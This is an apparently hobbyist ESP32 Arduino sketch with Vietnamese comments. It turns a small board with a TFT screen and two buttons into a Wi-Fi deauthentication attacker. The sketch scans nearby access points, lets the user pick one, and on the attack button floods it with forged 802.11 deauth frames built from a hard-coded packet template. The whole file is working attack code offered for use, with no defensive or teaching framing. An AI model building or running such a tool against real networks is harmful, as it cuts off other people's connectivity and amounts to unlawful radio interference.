#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <TFT_eSPI.h>
#include <SPI.h>
#include <vector>

// ================= LCD =================
TFT_eSPI tft = TFT_eSPI(160, 80);

// ================= Button =================
#define BTN_NEXT 5     // Chọn mục tiêu
#define BTN_ATTACK 23  // Tấn công / Hủy

// ================= Client struct =================
struct Client {
  uint8_t mac[6];
  int rssi;
};

std::vector<Client> clients;
volatile int clientIndex = 0;
bool attacking = false;

// ================= Packet deauth =================
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,              // Frame Control + Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination (broadcast)
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Source (AP MAC, fake)
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // BSSID (AP MAC, fake)
  0x01, 0x00                           // Reason code
};

// ================= Prototype =================
void sendDeauth(uint8_t *targetMac, uint8_t *apMac, int count);
void drawUI();

// ================= Scan WiFi =================
void scanNetworks() {
  clients.clear();
  int16_t n = WiFi.scanNetworks(false, true); // async = false, show hidden = true
  for (int i = 0; i < n; i++) {
    Client c;
    WiFi.BSSID(i, c.mac);
    c.rssi = WiFi.RSSI(i);
    clients.push_back(c);
  }
}

// ================= Send deauth =================
void sendDeauth(uint8_t *targetMac, uint8_t *apMac, int count) {
  memcpy(&deauthPacket[4], targetMac, 6);   // dest
  memcpy(&deauthPacket[10], apMac, 6);      // src
  memcpy(&deauthPacket[16], apMac, 6);      // BSSID

  for (int i = 0; i < count; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(1);
  }
}

// ================= Draw UI =================
void drawUI() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);

  if (clients.empty()) {
    tft.println("Dang quet WiFi...");
  } else {
    int showCount = std::min((int)clients.size(), 6); // fix ép kiểu
    for (int i = 0; i < showCount; i++) {
      if (i == clientIndex) tft.print("> ");
      else tft.print("  ");

      for (int j = 0; j < 6; j++) {
        tft.printf("%02X", clients[i].mac[j]);
        if (j < 5) tft.print(":");
      }
      tft.printf("  (%d)", clients[i].rssi);
      tft.println();
    }
    if (attacking) {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.println("\nTAN CONG!!!");
    }
  }
}

// ================= Setup =================
void setup() {
  Serial.begin(115200);
  pinMode(BTN_NEXT, INPUT_PULLUP);
  pinMode(BTN_ATTACK, INPUT_PULLUP);

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  scanNetworks();
  drawUI();
}

// ================= Loop =================
void loop() {
  static unsigned long lastScan = 0;

  // Quet WiFi moi 10s
  if (millis() - lastScan > 10000) {
    scanNetworks();
    drawUI();
    lastScan = millis();
  }

  // Nhan nut NEXT
  if (digitalRead(BTN_NEXT) == LOW) {
    clientIndex++;
    if (clientIndex >= (int)clients.size()) clientIndex = 0;
    drawUI();
    delay(200);
  }

  // Nhan nut ATTACK
  if (digitalRead(BTN_ATTACK) == LOW) {
    if (!attacking && !clients.empty()) {
      attacking = true;
      drawUI();
    } else {
      attacking = false;
      drawUI();
    }
    delay(200);
  }

  // Neu dang tan cong
  if (attacking && !clients.empty()) {
    Client target = clients[clientIndex];
    sendDeauth(target.mac, target.mac, 5);
  }
}